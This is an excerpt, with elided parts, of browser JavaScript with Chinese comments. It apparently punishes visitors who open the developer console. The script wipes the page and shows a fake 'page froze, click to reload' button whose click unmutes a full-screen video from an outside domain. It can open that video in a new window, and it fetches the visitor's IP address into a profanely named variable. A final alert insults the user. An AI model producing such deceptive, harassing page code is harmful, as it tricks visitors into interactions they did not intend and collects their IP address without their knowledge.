...
let userFuckingIP = undefined;
let hasInteracted = false;
let video = undefined;
let hadJumpOrDontHaveToJump = false;

// 事件处理函数
function handleUserInteraction(event) {
    if (!hasInteracted) {
        hasInteracted = true;
        hadJumpOrDontHaveToJump = true;
    }
    if (videoIsOpen) {
        video.muted = false; //现在取消静音
    }
}
...
function scaryMode() {
    try {
        ...
        document.body.innerHTML = ""; //清空页面防止组件被偷

        const button = document.createElement('button');
        button.textContent = '网页卡了。点我重新加载';
        button.style.position = 'fixed'; // 固定定位
        button.style.top = '50%'; // 垂直居中
        button.style.left = '50%'; // 水平居中
        button.style.transform = 'translate(-50%, -50%)'; // 使按钮的中心对齐到页面中心
        button.style.padding = '50px'; // 按钮内边距
        ...
        button.style.borderRadius = '10px'; // 圆角边框
        button.style.cursor = 'pointer'; // 鼠标悬停时显示指针
        button.style.zIndex = '1000'; // 确保按钮在上层
        // 将按钮添加到文档主体
        ...
        video.addEventListener('loadeddata', () => {
            ...
            setTimeout(() => {
                videoIsOpen = true;
            }, 500); // 延迟设置，防止alert阻止视频加载
        });

        // 设置视频源
        video.src = 'http://xn--qvrw50dh7j.top/video.mp4'; // 或者 http://xn--qvrw50dh7j.top/video.mp4
        ...
        if (hasInteracted) {
            ...
            setTimeout(() => {
                if (!hasInteracted) {
                    window.open("http://xn--qvrw50dh7j.top/video.mp4");
                    hadJumpOrDontHaveToJump = true;//跳转完了
                }
            }, 4000);
        }
        ...
        video.style.zIndex = '9999'; // 确保视频在所有元素之上
        video.style.objectFit = 'cover'; // 视频适应屏幕大小
...
function sendIP() {
    try {
        fetch('https://api.ipify.org?format=json')
            ...
            .then(json => userFuckingIP = json.ip);
    } catch (e) {
        userFuckingIP = "None";
    }
}
...
function checkVideo() {
    if (videoIsOpen) {
        if (hadJumpOrDontHaveToJump) { //跳转完了
            alert('开你妈控制台呢尼玛死了');
        }
